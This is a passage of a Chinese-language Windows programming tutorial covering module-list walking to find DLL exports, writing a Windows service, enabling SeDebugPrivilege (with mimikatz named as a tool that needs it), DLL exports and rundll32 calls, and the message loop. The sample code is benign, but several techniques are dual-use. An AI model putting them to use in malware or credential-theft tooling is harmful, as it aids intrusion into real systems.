\u4ed6\u6709\u4e09\u4e2aLIST_ENTRY\u7ed3\u6784\uff0c\u6bcf\u4e00\u4e2a\u90fd\u6309\u7167\u4e0d\u540c\u987a\u5e8f\u5c06\u8fdb\u7a0b\u52a0\u8f7d\u7684\u6240\u6709\u6a21\u5757\u8fde\u63a5\u8d77\u6765\uff0c\u901a\u8fc7\u904d\u5386\u4efb\u610f\u4e00\u4e2aLIST_ENTRY\u6211\u4eec\u5c31\u53ef\u4ee5\u83b7\u5f97\u6240\u6709\u6a21\u5757\u7684\u57fa\u5730\u5740\uff0c\u83b7\u5f97\u6bcf\u4e2a\u6a21\u5757\u57fa\u5730\u5740\u540e\u901a\u8fc7DLL\u6587\u4ef6\u5bfc\u51fa\u8868\u5c31\u53ef\u4ee5\u83b7\u5f97\u4efb\u4e00\u5bfc\u51fa\u51fd\u6570\u7684\u5730\u5740\u4e86\u3002 \u521b\u5efa\u670d\u52a1 \u670d\u52a1 Windows\u670d\u52a1\uff0c\u662f\u6307\u8fd0\u884c\u5728windows nt\u64cd\u4f5c\u7cfb\u7edf\u540e\u53f0\u7684\u8ba1\u7b97\u673a\u7a0b\u5e8f. Windows\u670d\u52a1\u5fc5\u987b\u7b26\u5408\u670d\u52a1\u63a7\u5236\u7ba1\u7406\u5668\u7684\u63a5\u53e3\u89c4\u5219\u548c\u534f\u8bae\uff08SCM) \u5982\u4f55\u521b\u5efa\u4e00\u4e2aWindows\u670d\u52a1 \u5206\u4e3a\uff1a 1.\u5b8c\u6210\u670d\u52a1\u7a0b\u5e8f\u4e3b\u51fd\u6570\uff08\u8fdb\u7a0b\u5165\u53e3\u70b9\uff08Main\u51fd\u6570 2.\u5b8c\u6210\u670d\u52a1\u7a0b\u5e8f\u5185\u5bb9\u4e3b\u51fd\u6570\uff08ServiceMain 3.\u670d\u52a1\u7684\u6ce8\u518c\u5668\u548c\u5378\u8f7d\u5668 \u670d\u52a1\u7a0b\u5e8f\u4e3b\u51fd\u6570 \u8fd9\u4e2a\u9636\u6bb5\uff0c\u4e3b\u8981\u5e72\u4e24\u4ef6\u4e8b\uff1a 1.\u8bbe\u5b9a\u597dSERVICE_TABLE_ENTRY \u7ed3\u6784\u53d8\u91cf\uff0c\u4f20\u5165\u670d\u52a1\u540d\u548c\u670d\u52a1\u4e3b\u51fd\u6570 2.\u8c03\u7528StartServiceCtrlDispatcher\u51fd\u6570 \u4ee5\u4e0b\u662fSERVICE_TABLE_ENTRY\u7ed3\u6784 typedef struct _SERVICE_TABLE_ENTRYW { LPWSTR lpServiceName; LPSERVICE_MAIN_FUNCTIONW lpServiceProc; }SERVICE_TABLE_ENTRYW, *LPSERVICE_TABLE_ENTRYW; \u6240\u4ee5\u6211\u4eec\u7684\u670d\u52a1\u7a0b\u5e8f\u7684\u4e3b\u51fd\u6570\u53ea\u9700\u8981\u50cf\u8fd9\u6837\u5199\u5373\u53ef int main(){ SERVICE_TABLE_ENTRY Table[] = { {L\"servicename\",ServiceMain},{NULL,NULL} }; StartServiceCtrlDispatcher(Table); } \u5728SERVICE_TABLE_ENTRY\u91cc\u6211\u4eec\u5b9a\u4e49\u597d\u4e86\u4e00\u4e2a\u670d\u52a1\u7684\u540d\u5b57\u4ee5\u53ca\u5176\u5165\u53e3\u51fd\u6570\uff0c\u7136\u540e\u4f7f\u7528StartServiceCtrlDispatcher\u53bb\u8c03\u7528\u8fd9\u4e2a\u7ed3\u6784\u3002 \u7b2c\u4e00\u6b65\u5c31\u662f\u8fd9\u4e48\u7b80\u5355\uff0c\u63a5\u4e0b\u6765\u8ba9\u6211\u4eec\u53bb\u5b9e\u73b0\u670d\u52a1\u7684\u5165\u53e3\u51fd\u6570 \u5b8c\u6210\u670d\u52a1\u7a0b\u5e8f\u5185\u5bb9\u4e3b\u51fd\u6570 \u8fd9\u4e00\u6b65\u4e3b\u8981\u8981\u5e72\u8fd9\u51e0\u4e2a\u4e8b\u60c5: 1.\u521b\u5efa\u670d\u52a1\u5185\u5bb9\u4e3b\u51fd\u6570 2\u5728\u670d\u52a1\u5185\u5bb9\u4e3b\u51fd\u6570\u91cc\u5b9e\u73b0 SERVICE_STATUS \u7ed3\u6784\u7684\u586b\u5145\uff0c\u7528\u4e8e\u4e0eSCM\u4ea4\u6d41 3.\u5b9e\u73b0\u670d\u52a1\u53e5\u67c4\uff0c\u5e76\u6839\u636e\u6709\u670d\u52a1\u53e5\u67c4\u6539\u53d8\u72b6\u6001\u4fe1\u606f\uff0c\u4ece\u800c\u5b9e\u73b0SCM\u53d1\u6765\u7684\u63a7\u5236\u8bf7\u6c42 4.\u903b\u8f91 \u521b\u5efa\u670d\u52a1\u5185\u5bb9\u4e3b\u51fd\u6570 \u6839\u636e\u6211\u4eec\u5728 SERVICE_TABLE_ENTRY \u7ed3\u6784\u4e2d\u5b9a\u4e49\u7684\u670d\u52a1\u5165\u53e3\u51fd\u6570\uff0c\u521b\u5efa\u5bf9\u5e94\u51fd\u6570 void WINAPI Servicename(DWORD argc, LPTSTR* argv) \u5b9e\u73b0 SERVICE_STATUS \u7ed3\u6784 SERVICE_STATUS \u7ed3\u6784\u5b9a\u4e49\u5982\u4e0b typedef struct _SERVICE_STATUS { DWORD dwServiceType; DWORD dwCurrentState; DWORD dwControlsAccepted; DWORD dwWin32ExitCode; DWORD dwServiceSpecificExitCode; DWORD dwCheckPoint; DWORD dwWaitHint; } SERVICE_STATUS, *LPSERVICE_STATUS; \u6bcf\u4e2a\u9879\u90fd\u5bf9\u5e94\u4e86\u53c2\u6570\u2026\u592a\u591a\u4e86\uff0c\u5efa\u8bae\u53bb\u5b98\u65b9\u6587\u6863\u5bf9\u7167 https://docs.microsoft.com/en-us/windows/win32/api/winsvc/ns-winsvc-service_status dwservicetype \u6307\u5b9a\u4e86\u670d\u52a1\u7684\u7c7b\u578b dwCurrentState \u6307\u5b9a\u670d\u52a1\u5f53\u524d\u7684\u72b6\u6001\uff08\u6302\u8d77\uff0c\u6682\u505c\uff0c\u542f\u52a8\uff0c\u505c\u6b62\u2026) dwControlsAccepted \u6307\u5b9a\u4e86\u670d\u52a1\u53e5\u67c4\u53ef\u4ee5\u63a5\u53d7\u7684\u53c2\u6570 dwWin32ExitCode \u670d\u52a1\u7528\u4e8e\u62a5\u544a\u9519\u8bef\u7684\u9519\u8bef\u4ee3\u7801 dwServiceSpecificExitCode \u670d\u52a1\u7279\u5b9a\u7684\u9519\u8bef\u4ee3\u7801 dwCheckPoint \u4e0d\u592a\u61c2 dwWaitHint \u6302\u8d77\u7684 \u542f\u52a8\uff0c\u505c\u6b62\uff0c\u6682\u505c\u6216\u7ee7\u7eed\u64cd\u4f5c\u6240\u9700\u7684\u4f30\u8ba1\u65f6\u95f4\uff0c\u4ee5\u6beb\u79d2\u4e3a\u5355\u4f4d \u3002\u82e5\u6307\u5b9a\u65f6\u95f4\u5df2\u8fc7\u53bb\u800cdwCheckPoint\u672a\u589e\u52a0\u6216\u8005dwCurrentState\u5c1a\u672a\u66f4\u6539\uff0c\u5219\u4e2d\u6b62\u670d\u52a1\u3002 \u603b\u800c\u8a00\u4e4b\uff0c\u5c31\u662f\u521b\u5efa\u4e00\u4e2a\u7ed3\u6784\u7528\u4e8e\u6536\u96c6\u670d\u52a1\u7684\u5404\u4e2a\u4fe1\u606f \u5b9e\u73b0\u670d\u52a1\u53e5\u67c4&\u6539\u53d8\u72b6\u6001\u4fe1\u606f \u5b9e\u73b0\u670d\u52a1\u53e5\u67c4\u4e3b\u8981\u662f\u4f9d\u9760RegisterServiceCtrlHandlerA\u51fd\u6570\u5b9e\u73b0\u7684\u3002 \u8fd9\u4e2a\u51fd\u6570\u7684\u4f5c\u7528\u662f\u6ce8\u518c\u4e00\u4e2a\u51fd\u6570\u6765\u5904\u7406\u6307\u5b9a\u670d\u52a1\u63a7\u5236\u8bf7\u6c42\u3002 \u8fd9\u4e2a\u51fd\u6570\u7684\u7ed3\u6784\u662f\u8fd9\u6837 SERVICE_STATUS_HANDLE RegisterServiceCtrlHandlerA( LPCSTR lpServiceName, LPHANDLER_FUNCTION lpHandlerProc ); lpservicename\u662f\u6307\u5b9a\u670d\u52a1\u540d,lphandlerproc\u662f\u88ab\u6ce8\u518c\u7684\u51fd\u6570\u3002\u6240\u4ee5\u6211\u4eec\u8981\u4f7f\u7528\u8fd9\u4e2a\u51fd\u6570\u6765\u6ce8\u518c\u53e6\u4e00\u4e2a\u51fd\u6570\uff0c\u9996\u5148\u8981\u5b8c\u6210\u88ab\u6ce8\u518c\u51fd\u6570\u7684\u5185\u90e8\u903b\u8f91\u3002\u8fd9\u91cc\u505a\u4e2a\u8303\u4f8b void WINAPI ctrl(DWORD Opcode) //\u5b9a\u4e49\u5f0f\u56fa\u5b9a { switch (Opcode) { case SERVICE_CONTROL_PAUSE: m_ServiceStatus.dwCurrentState = SERVICE_PAUSED; break; case SERVICE_CONTROL_CONTINUE: m_ServiceStatus.dwCurrentState = SERVICE_RUNNING; break; case SERVICE_CONTROL_STOP: m_ServiceStatus.dwWin32ExitCode = 0; m_ServiceStatus.dwCurrentState = SERVICE_STOPPED; m_ServiceStatus.dwCheckPoint = 0; m_ServiceStatus.dwWaitHint = 0; SetServiceStatus(m_ServiceStatusHandle, &m_ServiceStatus); bRunning = false; break; case SERVICE_CONTROL_INTERROGATE: break; } return; } \u6211\u4eec\u53d1\u73b0\u8fd9\u4e2a\u51fd\u6570\u4f1a\u6839\u636e\u4f20\u5165\u7684\u503c\u6539\u53d8 SERVICE_STATUS \u7ed3\u6784\u3002 \u82e5\u628a\u4ed6\u6ce8\u518c\uff0c\u90a3\u4e48\u4ece\u670d\u52a1\u7ba1\u7406\u63a7\u5236\u5668\u53d1\u6765\u7684\u63a7\u5236\u6307\u4ee4\u4f1a\u88ab\u5f53\u4f5c\u53c2\u6570\u4f20\u5165\u8be5\u51fd\u6570\uff0c\u7136\u540e\u8be5\u51fd\u6570\u4f1a\u4fee\u6539 SERVICE_STATUS \u3002 \u90a3\u4e48\u6539\u53d8\u72b6\u6001\u4fe1\u606f\u7684\u51fd\u6570\u4e3b\u8981\u5c31\u662fSetServiceStatus \u4e86 BOOL SetServiceStatus( SERVICE_STATUS_HANDLE hServiceStatus, LPSERVICE_STATUS lpServiceStatus ); hservicestatus \u6307\u5411\u670d\u52a1\u53e5\u67c4 lpservicestatus \u6307\u5411 SERVICE_STATUS \u7ed3\u6784\u3002 \u5b8c\u6210\u8fd9\u4e2a\u51fd\u6570\u540e\uff0c\u670d\u52a1\u5c31\u4f1a\u5411\u670d\u52a1\u63a7\u5236\u7ba1\u7406\u5668\u53d1\u9001\u81ea\u5df1\u6700\u65b0\u7684\u72b6\u6001\u4fe1\u606f\uff08\u5373 SERVICE_STATUS \u91cc\u5b9a\u4e49\u7684\u4e1c\u897f\uff09\u3002 DEMO #include<Windows.h> SERVICE_STATUS m_ServiceStatus; SERVICE_STATUS_HANDLE m_ServiceStatusHandle; BOOL bRunning; int main() { WCHAR Servicename[] = L\"ServiceA\"; SERVICE_TABLE_ENTRY Table[] = { {Servicename,ServiceMain},{NULL,NULL} }; StartServiceCtrlDispatcher(Table); } void WINAPI ServiceMain(DWORD argc, LPTSTR* argv) { m_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS; m_ServiceStatus.dwCurrentState = SERVICE_START_PENDING; m_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP; m_ServiceStatus.dwWin32ExitCode = 0; m_ServiceStatus.dwServiceSpecificExitCode = 0; m_ServiceStatus.dwCheckPoint = 0; m_ServiceStatus.dwWaitHint = 0; m_ServiceStatusHandle = RegisterServiceCtrlHandler(L\"ServiceA\", HandlerFunc); m_ServiceStatus.dwCurrentState = SERVICE_RUNNING; m_ServiceStatus.dwCheckPoint = 0; m_ServiceStatus.dwWaitHint = 0; SetServiceStatus(m_ServiceStatusHandle, &m_ServiceStatus); bRunning = true; while (bRunning) { //your code } return 0; } void WINAPI HandlerFunc(DWORD code) { switch (code) { case SERVICE_CONTROL_PAUSE: m_ServiceStatus.dwCurrentState = SERVICE_PAUSED; break; case SERVICE_CONTROL_CONTINUE: m_ServiceStatus.dwCurrentState = SERVICE_RUNNING; break; case SERVICE_CONTROL_STOP: m_ServiceStatus.dwWin32ExitCode = 0; m_ServiceStatus.dwCurrentState = SERVICE_STOPPED; m_ServiceStatus.dwCheckPoint = 0; m_ServiceStatus.dwWaitHint = 0; SetServiceStatus(m_ServiceStatusHandle, &m_ServiceStatus); bRunning = false; break; case SERVICE_CONTROL_INTERROGATE: break; } } \u542f\u7528SeDebugPrivilege \u6709\u5f88\u591a\u5de5\u5177\u9700\u8981\u542f\u7528SeDebugPrivilege\u624d\u80fd\u6b63\u5e38\u4f7f\u7528\uff0c\u6bd4\u5982mimikatz\u5c31\u6709\u4e2a\u5f88\u7ecf\u5178\u7684 privilege::debug.\u5982\u679c\u6ca1\u6709\u8fd9\u4e2a\u6743\u9650\uff0cadministrator\u7528openprocess\u53ef\u80fd\u90fd\u4f1a\u62a5\u9519\uff0c\u6240\u4ee5\u9700\u8981\u63d0\u5347\uff0c\u7ba1\u7406\u5458\u7ec4\u62e5\u6709\u8be5\u6743\u9650\u4f46\u9ed8\u8ba4\u7981\u7528\uff0c\u666e\u901a\u7528\u6237\u4e0d\u62e5\u6709\u8be5\u6743\u9650\uff0c\u4e5f\u5c31\u662f\u8bf4\u4ec5\u4ec5\u53ea\u6709\u7ba1\u7406\u5458\u8d26\u6237\u80fd\u542f\u7528\u8be5\u6743\u9650\u3002\u8fd9\u4e2a\u6743\u9650\u63d0\u4f9b\u4e86\u5f3a\u5927\u7684\u80fd\u529b\u4ee5\u81f3\u4e8e\u53ef\u4ee5\u5ffd\u89c6\u5b89\u5168\u4e0a\u4e0b\u6587\u884c\u52a8\u3002 \u6211\u4eec\u4f1a\u7528\u5230AdjustTokenPrivileges\u548cLookupPrivilegeValueA\uff0c\u4ee5\u53caToken PRIVILEGES\u7ed3\u6784\u6811 Token PRIVILEGES\u7ed3\u6784\u6811 typedef struct _TOKEN_PRIVILEGES { DWORD PrivilegeCount; LUID_AND_ATTRIBUTES Privileges[ANYSIZE_ARRAY]; } TOKEN_PRIVILEGES, *PTOKEN_PRIVILEGES; PrirvilegeCount \u8868\u793aPrivileges\u6570\u7ec4\u4e2d\u6709\u591a\u5c11\u4e2a\u5143\u7d20 Privileges \u6307\u5411LUID_AND_ATTRIBUTES\u7ed3\u6784\uff0c\u8be5\u7ed3\u6784\u7528\u4e8e\u5177\u4f53\u8868\u793a\u67d0\u4e2a\u6743\u9650\u7684\u5f00\u542f\u6216\u5173\u95ed typedef struct _LUID_AND_ATTRIBUTES { LUID Luid; DWORD Attributes; } LUID_AND_ATTRIBUTES, *PLUID_AND_ATTRIBUTES;` Luid \u9009\u62e9\u4e00\u4e2aLUID\u503c\uff0c\u8be5\u503c\u5bf9\u5e94\u4e00\u4e2a\u6743\u9650 Attributes \u9009\u62e9\u6307\u5b9aLUID\u7684\u6743\u9650\u7684\u5f00\u653e\u6216\u5173\u95ed\uff0c\u5176\u8be6\u7ec6\u53c2\u6570\u5982\u4e0b \u200b SE_PRIVILEGE_ENABLED The privilege is enabled. \u200b SE_PRIVILEGE_ENABLED_BY_DEFAULT The privilege is enabled by default. \u200b SE_PRIVILEGE_REMOVED Used to remove a privilege. For details, see AdjustTokenPrivileges . \u200b SE_PRIVILEGE_USED_FOR_ACCESS The privilege was used to gain access to an object or service. This flag is used to identify the relevant privileges in a set passed by a client application that may contain unnecessary privileges. \u4e0b\u9762\u6211\u4eec\u6765\u5c55\u793a\u5982\u4f55\u5229\u7528windows \u7f16\u7a0b\u83b7\u53d6\u8be5\u6743\u9650\u3002 \u8fd9\u53ea\u662f\u4e00\u4e2a\u51fd\u6570demo\uff0c\u4fee\u6539\u5f53\u524d\u8fdb\u7a0b\u7684\u6743\u9650\u3002 BOOL GetDebugPriv() { HANDLE Token; TOKEN_PRIVILEGES tp; LUID Luid; if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &Token)) { //TOKEN_ADJUST_PRIVILEGES\u4ee3\u8868\u8981\u4fee\u6539\u4ee4\u724c\u6743\u9650 std::cout << \"OpenProcessToken ERROR\" << GetLastError() << std::endl; return false; } tp.PrivilegeCount = 1; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &Luid)) { std::cout << \"LookupPrivilegeValue ERROR\" << GetLastError() << std::endl; return false; } tp.Privileges[0].Luid = Luid; if (!AdjustTokenPrivileges(Token, FALSE, &tp, sizeof(tp), NULL, NULL) ){ std::cout << \"AdjustTokenPrivileges ERROR\" << GetLastError() << std::endl; return false; } if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) { //ERROR_NOT_ALL_ASSIGNED\u7684\u51fa\u73b0\u539f\u56e0\u662f\uff0c\u7528\u6237\u6743\u9650\u672c\u8eab\u5c31\u6ca1\u6709sedebugprivilege return false; } else { return true; } } dll\u7f16\u5199 DLL\u6587\u4ef6\uff0c\u5373\u52a8\u6001\u94fe\u63a5\u5e93\u6587\u4ef6\uff0c\u5728windows\u4e2d\u8bb8\u591ape\u6587\u4ef6\u8fd0\u884c\u65f6\u9700\u8981\u5c06\u4e00\u4e9bdll\u6587\u4ef6\u52a0\u8f7d\u8fdb\u5185\u5b58\uff0c\u4ece\u800c\u8c03\u7528dll\u6587\u4ef6\u91cc\u7684\u5185\u5bb9\u3002 DLLMAIN dllmain\uff0c\u662fdll\u5728\u88ab\u52a0\u8f7d\u65f6\u6267\u884c\u7684\u51fd\u6570\uff08dllmain\u5728dll\u6587\u4ef6\u4e2d\u4e0d\u662f\u5fc5\u987b\u7684\uff09 BOOL WINAPI DLLMain( //\u6307\u5411\u81ea\u8eab\u53e5\u67c4 _In_HINSTANCE hinstDLL, //\u8f7d\u5165\u72b6\u6001 _In_DWORD fdwReason, //\u52a0\u8f7d\u65b9\u5f0f\uff08\u9690\u5f0f\u3001\u663e\u5f0f\uff09 _In_LPVOID IpvReserved ); \u5176\u4e2d\uff0c\u8f7d\u5165\u72b6\u6001\u6709\u56db\u79cd\uff0c\u5982\u4e0b DLL_PROCESS_ATTACH\uff1a\u8fdb\u7a0b\u8fdb\u5165\u65f6 DLL_PROCESS_DETACH\uff1a\u8fdb\u7a0b\u9000\u51fa\u65f6 DLL_THREAD_ATTACH\uff1a\u7ebf\u7a0b\u8fdb\u5165\u65f6 DLL_THREAD_DETACH\uff1a\u7ebf\u7a0b\u9000\u51fa\u65f6 dllmain\u6839\u636e\u8f7d\u5165\u72b6\u6001\u7684\u4e0d\u540c\uff0c\u53ef\u4ee5\u505a\u51fa\u4e0d\u540c\u7684\u53cd\u5e94\u3002\u5c31\u50cf\u8fd9\u6837 #include <iostream> BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: std::cout << \"Process attach. \\n\"; break; case DLL_PROCESS_DETACH: std::cout << \"Process exit. \\n\"; break; case DLL_THREAD_ATTACH: std::cout << \"Thread attach. \\n\"; break; case DLL_THREAD_DETACH: std::cout << \"Thread exit. \\n\"; break; } return TRUE; } DLL \u5bfc\u51fa\u51fd\u6570 dll\u7f16\u5199\u65f6\uff0c\u8981\u7528__declspec\u5173\u952e\u5b57\u6807\u660e\u54ea\u4e9b\u51fd\u6570\u662f\u8981\u5bfc\u51fa\u7684,_ __declspec(dllexport) \u7528\u4e8eWindows\u4e2d\u7684\u52a8\u6001\u5e93\u4e2d\uff0c\u58f0\u660e\u5bfc\u51fa\u51fd\u6570\u3001\u7c7b\u3001\u5bf9\u8c61\u7b49\u4f9b\u5916\u9762\u8c03\u7528,\u50cf\u8fd9\u6837 extern \"C\" int _declspec(dllexport) go() { std::cout<<\"gogo\" } \u8fd9\u6837\u5c31\u8bbe\u7f6e\u597d\u4e00\u4e2a\u7528\u4e8e\u5bfc\u51fa\u7684\u51fd\u6570\u4e86\u3002 \u9898\u5916\u8bdd\uff1a\u600e\u4e48\u4f7f\u7528dll\u6216lib\u4e2d\u7684\u5bfc\u51fa\u51fd\u6570 \u5bf9\u4e8elib\uff08\u9759\u6001\u94fe\u63a5\u5e93\uff09\u6765\u8bf4\uff0c\u4f7f\u7528\u9759\u6001\u94fe\u63a5 dll\uff08\u52a8\u6001\u94fe\u63a5\u5e93\uff09\u6765\u8bf4\u4f7f\u7528\u52a8\u6001\u94fe\u63a5 \u9759\u6001\u94fe\u63a5 \u53c8\u53eb\u9690\u5f0f\u94fe\u63a5\u3002\u94fe\u63a5\u5668\u4ece\u5e93\u4e2d\u590d\u5236\u8fd9\u4e9b\u51fd\u6570\u548c\u6570\u636e\u5e76\u628a\u5b83\u4eec\u548c\u5e94\u7528\u7a0b\u5e8f\u7684\u5176\u5b83\u6a21\u5757\u7ec4\u5408\u8d77\u6765\u521b\u5efa\u6700\u7ec8\u7684\u53ef\u6267\u884c\u6587\u4ef6(.EXE\u6587\u4ef6)\uff0c\u6240\u4ee5\u7ec4\u6210\u7684exe\u6587\u4ef6\u4f53\u79ef\u8f83\u5927 #pragma comment(lib,\"testDLL.lib\") //\u5728\u6b64\u5904\u901a\u8fc7\u9759\u6001\u94fe\u63a5\uff0c\u6b64\u4e4b\u524d\u628a\u751f\u6210\u7684lib\u6587\u4ef6\u653e\u5165loadDLL\u5de5\u7a0b\u6587\u4ef6\u5939\u4e0b\u9762\uff0c\u5e76\u8bbe\u7f6e\u7f16\u8bd1\u5668\u7684\u9644\u52a0\u4f9d\u8d56\u9879\u4e2d\u589e\u52a0\u6b64lib extern \"C\"_declspec(dllimport) int go(); //\u58f0\u660e\u51fd\u6570 int main(){ go(); } \u52a8\u6001\u94fe\u63a5 \u53c8\u53eb\u663e\u793a\u94fe\u63a5\uff0c\u5c06\u4e00\u4e9bapi\u51fd\u6570\u5199\u5165\u5230\u4e00\u4e2adll\u6587\u4ef6\u4e2d\uff0c\u5728\u7a0b\u5e8f\u5728\u7a0b\u5e8f\u8fd0\u884c\u65f6\u518d\u52a0\u8f7d\u5230\u7a0b\u5e8f\u7684\u8fdb\u7a0b\u7a7a\u95f4\u4e2d\u4f7f\u7528\uff0c\u8fd9\u6837\u53ef\u4ee5\u8ba9\u8fd0\u884c\u7a0b\u5e8f\u672c\u8eab\u4f53\u79ef\u8f83\u5c0f\uff0c\u65b9\u4fbf\u6a21\u5757\u5316\u7f16\u7a0b\u3002 int TestDLL() { HMODULE hModule = NULL; typedef int (*Func)(int a, int b); // \u52a8\u6001\u52a0\u8f7d DLL \u6587\u4ef6 hModule = LoadLibrary(_TEXT(\"..//Debug//FuncDll.dll\" )); // \u83b7\u53d6 fun\u51fd\u6570\u5730\u5740 Func fAdd = (Func)GetProcAddress(hModule, \"fun\" ); // \u4f7f\u7528\u51fd\u6570\u6307\u9488 printf(\"%d/n\" , fAdd(3, 1)); // \u91ca\u653e\u6307\u9488 FreeLibrary(hModule); return 0; } rundll32 \u7528rundll32.exe \u53ef\u4ee5\u6267\u884cdll\u4e2d\u7684\u67d0\u4e00\u5bfc\u51fa\u51fd\u6570 \u4f46\u662f\u4e0d\u662f\u6240\u6709\u51fd\u6570\u90fd\u80fd\u901a\u8fc7rundll32\u8c03\u7528\uff0c\u51fd\u6570\u5fc5\u987b\u7b26\u5408\u5982\u4e0b\u5b9a\u4e49 VOID CALLBACK FunctionName (HWND hwnd,HINSTANCE hinst,LPTSTR lpCmdLine,INT nCmdShow); \u8fd9\u91cc\u968f\u4fbf\u5199\u4e86\u4e2a extern \"C\" __declspec(dllexport) void rundll(HWND hwnd, HINSTANCE hinst, LPTSTR lpCmdLine, INT nCmdShow) { MessageBox(NULL, TEXT(\"-Test-\"), TEXT(\"Rundll32\"), MB_OK); } \u6d88\u606f\u673a\u5236 \u4e8b\u4ef6\u9a71\u52a8 Windows\u662f\u57fa\u4e8e\u4e8b\u4ef6\u9a71\u52a8\u7684. \u4e00\u822c\u6765\u8bb2\uff0c \u670d\u52a1\u5668\u5904\u7406\u6a21\u578b\u6709\u4e09\u79cd: 1\u6bcf\u6536\u5230\u4e00\u4e2a\u8bf7\u6c42\uff0c\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u8fdb\u7a0b\uff0c\u6765\u5904\u7406\u8be5\u8bf7\u6c42\uff1b 2\u6bcf\u6536\u5230\u4e00\u4e2a\u8bf7\u6c42\uff0c\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u7ebf\u7a0b\uff0c\u6765\u5904\u7406\u8be5\u8bf7\u6c42\uff1b 3\u6bcf\u6536\u5230\u4e00\u4e2a\u8bf7\u6c42\uff0c\u653e\u5165\u4e00\u4e2a\u4e8b\u4ef6\u5217\u8868\uff0c\u8ba9\u4e3b\u8fdb\u7a0b\u901a\u8fc7\u975e\u963b\u585eI/O\u65b9\u5f0f\u6765\u5904\u7406\u8bf7\u6c42 1 \u5f00\u9500\u8f83\u5927:\u6bcf\u5904\u7406\u4e00\u4e2a\u4e8b\u4ef6\u5c31\u8981\u65b0\u5efa\u4e00\u4e2a\u8fdb\u7a0b\uff0c\u5f00\u9500\u592a\u5927\uff0c\u4f46\u662f\u5b9e\u73b0\u8d77\u6765\u5f88\u7b80\u5355 2 \u6b7b\u9501\u95ee\u9898:\u591a\u7ebf\u7a0b\u8c03\u8282\u5bb9\u6613\u9047\u5230\u6b7b\u9501\u95ee\u9898\uff0c\u7a0b\u5e8f\u76f4\u63a5\u5361\u6b7b 3 \u903b\u8f91\u590d\u6742 \u90a3\u4e48\u4e8b\u4ef6\u9a71\u52a8\u7684\u4f18\u52bf\u5728\u54ea\u91cc\u5462\u3002 \u6253\u4e2a\u6bd4\u65b9\uff0c\u6211\u4eec\u8981\u83b7\u53d6\u4e00\u4e2a\u9f20\u6807\u70b9\u51fb\u7684\u52a8\u4f5c\u3002 \u5982\u679c\u6211\u4eec\u901a\u8fc7\u521b\u5efa\u7ebf\u7a0b\u6216\u8005\u8fdb\u7a0b\u7684\u65b9\u6cd5\uff0c\u53bb\u5faa\u73af\u626b\u63cf\u5f53\u524d\u662f\u5426\u6709\u9f20\u6807\u70b9\u51fb\u4e8b\u4ef6\u90a3\u4e48\u53ef\u80fd\u4f1a\u9020\u6210\u8d44\u6e90\u6d6a\u8d39\uff08\u9f20\u6807\u4e00\u76f4\u4e0d\u70b9\u51fb\uff0c\u4f46\u4ecd\u5728\u8fdb\u884c\u626b\u63cf\uff09\uff0c\u54cd\u5e94\u7f13\u6162\uff08\u626b\u63cf\u7684\u8bbe\u5907\u6709\u5f88\u591a\uff0c\u4f1a\u9020\u6210\u54cd\u5e94\u7f13\u6162\u7684\u95ee\u9898\uff09\u7b49\u95ee\u9898\u3002 \u4f46\u662f\u4e8b\u4ef6\u9a71\u52a8\u5c31\u4e0d\u4e00\u6837\u4e86\uff0c\u5b83\u7684\u6838\u5fc3\u539f\u7406\u662f\u4ee5\u6d88\u606f\u961f\u5217\u4e3a\u6838\u5fc3\uff0c\u5f53\u6355\u83b7\u5230\u4e00\u4e2a\u4e8b\u4ef6\uff08\u5982\u9f20\u6807\u70b9\u51fb\uff09\u65f6\u628a\u4ed6\u653e\u8fdb\u6d88\u606f\u961f\u5217\uff0c\u7136\u540e\u5f53\u8be5\u4e8b\u4ef6\u4ece\u961f\u5217\u4e2d\u88ab\u53d6\u51fa\u65f6\uff0c\u6839\u636e\u4e8b\u4ef6\u7c7b\u578b\u8c03\u7528\u4e0d\u540c\u7684\u51fd\u6570\u6765\u8fdb\u884c\u5904\u7406,\u5176\u4e2d\u6bcf\u4e2a\u4e8b\u4ef6\u4e00\u822c\u90fd\u5404\u81ea\u4fdd\u5b58\u5404\u81ea\u7684\u5904\u7406\u51fd\u6570\u6307\u9488\uff0c\u8fd9\u6837\uff0c\u6bcf\u4e2a\u6d88\u606f\u90fd\u6709\u72ec\u7acb\u7684\u5904\u7406\u51fd\u6570 \u3002 \u6d88\u606f\u673a\u5236 \u4e8b\u4ef6\u9a71\u52a8\u5728Windows\u4e0b\u7684\u5177\u8c61\u5316\u5c31\u662f\u6d88\u606f\u673a\u5236\u3002 \u4e8b\u4ef6\u961f\u5217\u5bf9\u5e94\u8fc7\u6765\u5c31\u662f\u6d88\u606f\u961f\u5217. \u5b83\u4f1a\u4e3a\u6bcf\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u65b0\u5f00\u4e00\u4e2a\u5bf9\u5e94\u7684\u6d88\u606f\u961f\u5217\uff0c\u7528\u4e8e\u6355\u83b7\u5176\u6d88\u606f\u3002 \u6211\u4eec\u4ee5\u4e00\u4e2a\u7b80\u5355\u7684\u7a97\u53e3\u5b9e\u73b0\u6765\u770b\u770b\u6d88\u606f\u673a\u5236\u3002 \u6ce8\u610f\u4e0b\u65b9\u6ce8\u91ca\u5904\u5373\u53ef\u3002 #include<Windows.h> LRESULT CALLBACK WndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam); int WINAPI WinMain(HINSTANCE hinstance, HINSTANCE hPrevInStance, LPSTR lpCmdLine, int nShowCmd) { static TCHAR szAppName[] = TEXT(\"\u7a97\u53e3\u7c7b\u540d\u79f0\"); HWND hwnd; MSG msg; WNDCLASSEX wndclass = { 0 }; //\u8bbe\u8ba1\u7a97\u53e3\u7c7b wndclass.cbSize = sizeof(WNDCLASSEX); wndclass.style = CS_HREDRAW | CS_VREDRAW; wndclass.lpfnWndProc = WndProc; wndclass.cbClsExtra = 0; wndclass.cbWndExtra = 0; wndclass.hInstance = hinstance; wndclass.hIcon = LoadIcon(NULL, IDI_APPLICATION); wndclass.hCursor = LoadCursor(NULL, 